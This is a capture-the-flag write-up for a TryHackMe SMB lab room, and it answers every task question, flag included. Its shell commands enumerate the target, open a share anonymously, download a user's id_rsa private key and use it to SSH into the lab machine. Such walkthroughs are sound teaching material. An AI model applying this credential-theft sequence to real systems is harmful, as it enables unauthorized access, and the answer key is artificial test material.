# Network Services

<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/623103b06d1d53c3d8bddfc16998f9d7.png" width="128" />

## Task 1 - Get Connected

> Ready? Let's get going!

No answer needed

## Task 2 - Understanding SMB

> What does SMB stand for?

Server Message Block

> What type of protocol is SMB?

response-request

> What do clients connect to servers using?

TCP/IP

> What systems does Samba run on?

Unix

## Task 3 - Enumerating SMB

> Conduct an nmap scan of your choosing, How many ports are open?

3

> What ports is SMB running on?

139/445

> Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?

WORKGROUP

Run:

```bash
 enum4linux -a <IP>
 enum4linux -a 10.10.10.1
```

<Image src="/images/writeups/thm/network/smb-workspace.png" />

> What comes up as the name of the machine?

POLOSMB

> What operating system version is running?

6.1

<Image src="/images/writeups/thm/network/smb-os.png" />

> What share sticks out as something we might want to investigate?

profiles

<Image src="/images/writeups/thm/network/smb-shares.png" />

## Task 4 - Exploiting SMB

> What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

smbclient //10.10.10.2/secret -U suit

> Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.

No answer needed

> Does the share allow anonymous access? Y/N?

Y

Run this command and press enter when it asks for a password:

```bash
smbclient //10.10.147.248/profiles -U Anonymous
```

> Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

John Cactus

```bash
smbclient //10.10.147.248/profiles -U Anonymous
get 'Working From Home Information.txt'
exi
cat 'Working From Home Information.txt'
```

<Image src="/images/writeups/thm/network/smb-document.png" />

> What service has been configured to allow him to work from home?

ssh

> Okay! Now we know this, what directory on the share should we look in?

.ssh

> This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

id_rsa

> What is the smb.txt flag?

THM{smb_is_fun_eh?}

To enter the ssh server, run this commands:

```bash
# move to root directory
cd

# connect to smb folder and get the key for ssh
smbclient //10.10.147.248/profiles -U Anonymous
get .ssh/id_rsa
exit

# add key to ssh
chmod 600 .ssh/id_rsa
ssh-add

# connect to ssh
ssh cactus@10.10.147.248
cat smb.txt
```
